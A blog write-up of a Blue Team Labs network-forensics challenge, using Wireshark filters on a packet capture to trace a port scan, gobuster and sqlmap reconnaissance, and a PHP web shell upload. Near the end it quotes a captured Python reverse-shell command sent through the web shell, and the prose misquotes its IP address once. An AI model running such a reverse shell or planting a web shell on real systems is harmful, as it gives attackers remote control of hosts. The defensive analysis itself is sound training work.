---
layout: post
title:  "BTLO | Network Analysis - Web Shell"
date:   2021-09-15 22:30:00
tags: [Security, BlueTeamLabs, Cyber Defense]
style: border
color: primary
description: "Blue Team Labs: Network Analysis - Web Shell Writeup"
---

This is my write-up for [Network Analysis - Web Shell](https://blueteamlabs.online/home/challenge/12) on Blue Team Labs.

**P.S: I highly encourage you to try solving the challenges on your own first then check this writeup if you are stuck.**

**Scenario**

>The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. 

To solve this challenge we are required to download the task file, extract the zip file using the password provided, and analyze the `.pcap` file using [Wireshark](https://www.wireshark.org/). 


## **Q.** What is the IP responsible for conducting the port scan activity?
**A.** 10.251.96.4

You might notice when we first open up the PCAP file a lot is going on. In fact, we have 17508 packets in this capture. We're looking for a needle in a hay stack. With that said, we need to sift through the noise vs what is abnormal traffic. As we go along you'll notice I'm using filters heavily to do this.

First, we need to get an idea of what hosts are communicating. A great way to do this initially is to view TCP conversations. To do this in Wireshark we need to navigate to ***Statistics > Conversation > TCP***. This will give us a more digestable view of what ip addresses are communicating, as well as the destination and source ports used.

Upon clicking the **TCP tab**, we see several entries of port scan activity orginating from the IP `10.251.96.4`.

![](https://i.imgur.com/asxEtZK.png)

## **Q.** What is the port range scanned by the suspicious host?
**A.** 1-1024

 I'd advise sorting the **Port B** column to see the first and last port range scanned.

 ![](https://i.imgur.com/k8TIAyR.png) 

## **Q.** What is the type of port scan conducted?
**A.** TCP SYN

Having concluded that `10.251.96.4` is conducting the port scan, we can filter for `ip.src==10.251.96.4` to zone in only on that IP.

![](https://i.imgur.com/abOm3sd.png)

We can see `SYN` in alot of the packets info section as well as the `SYN` Flag is set under **Transmission Control Protocol**.

## **Q.** Two more tools were used to perform reconnaissance against open ports, what were they?
**A.** Gobuster 3.0.1, sqlmap 1.4.7

To find out what reconnaissance tools were used we need to utilize **User Agent Strings**. This string will often reveal what agent is used to access a host.

The following filter below will show us all packets with the target destination IP, `10.251.96.5` and that have a user agent string that is not from a Firefox web browser. Why did we do this?

Well we want to filter out as much noise as possible. We only need to see the user agents used that do not originate from a web browser. Therefore, we used the `!=` aka `NOT` operator in reference to Mozilla Firefox.

`ip.dst==10.251.96.5 && http.user_agent != "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"`

![](https://i.imgur.com/54KR8E4.png)

We see several `HTTP GET` requests. Inspecting those packets further reveals the use of `gobuster 3.0.1`, a tool designed to discover possible hidden web directories or files.

Since we know about `gobuster`. We can modify our filter from before to now filter out the `gobuster` user agent string honing in on the 2nd tool used.

`ip.dst==10.251.96.5 && http.user_agent != "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" && http.user_agent != "gobuster/3.0.1"`

![](https://i.imgur.com/aorwa90.png)

After applying our modified filter, the results show more packets but with a different user agent string, `sqlmap 1.4.7`. This tool is popular for automating the process of detecting SQL injection vulnerabilities.

## **Q.** What is the name of the php file through which the attacker uploaded a web shell?
**A.** editprofile.php

Websites have several request methods but the two most common are `GET` and `POST` requests.

- `GET` is for reading or retrieving information about the webpage
- `POST` is for submitting information to the webpage. Usually this is in the constuct of forms.

That said, since the attacker was "uploading" a web shell it's safe to conclude this is a `POST` request. We can tell Wireshark to filter for `POST` requests using the filter string below.

`ip.dst==10.251.96.5 && http.request.method == "POST"`

Drilling down further:

`ip.dst==10.251.96.5 && http.request.method == "POST" && http.user_agent != "gobuster/3.0.1" && http.user_agent != "sqlmap/1.4.7#stable (http://sqlmap.org)"`

Notice I again used `!=` aka `NOT` operators to filter out the `POST` requests made earlier by `gobuster` and `sqlmap` but took out the Mozilla Firefox filter. This is because we know the attacker used a web browser to access the form.

![](https://i.imgur.com/TIqrBh1.png)

Looking closer we see the `Referer` references `http://10.251.96.5/editprofile.php`.

## **Q.** What is the name of the web shell that the attacker uploaded?
**A.** dbfunctions.php

Digging further into packet no. 16102 we can follow the TCP Stream by selecting the packet and pressing `Ctrl`{: .key}+`Alt`{:.key}+`Shift`{:.key}+`T`{:.key}

Following the TCP Stream, this cleanly lays out the packet information, where we see the uploaded filename `dbfunctions.php`.

NOTE: You can also filter the TCP stream with the following filter:

`tcp.stream==1270`

![](https://i.imgur.com/S8QqVH6.png)

## **Q.** What is the parameter used in the web shell for executing commands?
**A.** cmd

Looking at the code of the `dbfunctions.php` web shell we can see that the parameter used in the web shell for executing commands is `cmd`.

![](https://i.imgur.com/OBNFMZg.png)

## **Q.** What is the first command executed by the attacker?
**A.** id

Unforunately the attacker successfully was able to successfully upload the web shell. Now we can expect `GET` requests referencing the web shell to follow as `cmd`.

We can filter this and see what commands the attacker is executing.

`ip.dst==10.251.96.5 && http.request.method == "GET"`

Drilling down further:

`ip.dst==10.251.96.5 && http.request.method == "GET" && http.request.uri contains "/uploads/dbfunctions.php"`

We see commands `id` and `whoami` ran. Looks like the attacker wants to know what user was just compromised.

![](https://i.imgur.com/37cJJoO.png)

## **Q.** What is the type of shell connection the attacker obtains through command execution?
**A.** reverse

The third command is a Python script. Follow the TCP Stream to view it.

```console
GET /uploads/dbfunctions.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.251.96.4%22,4422));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1
```

Dissecting the Python script tells us that is it a reverse shell to the IP address `210.251.96.4` on port `4422` using `/bin/sh`.

## **Q.** What is the port he uses for the shell connection?
**A.** 4422

As stated before the Python script uses port `4422`

**References:**
- [https://www.wireshark.org/docs/](https://www.wireshark.org/docs/)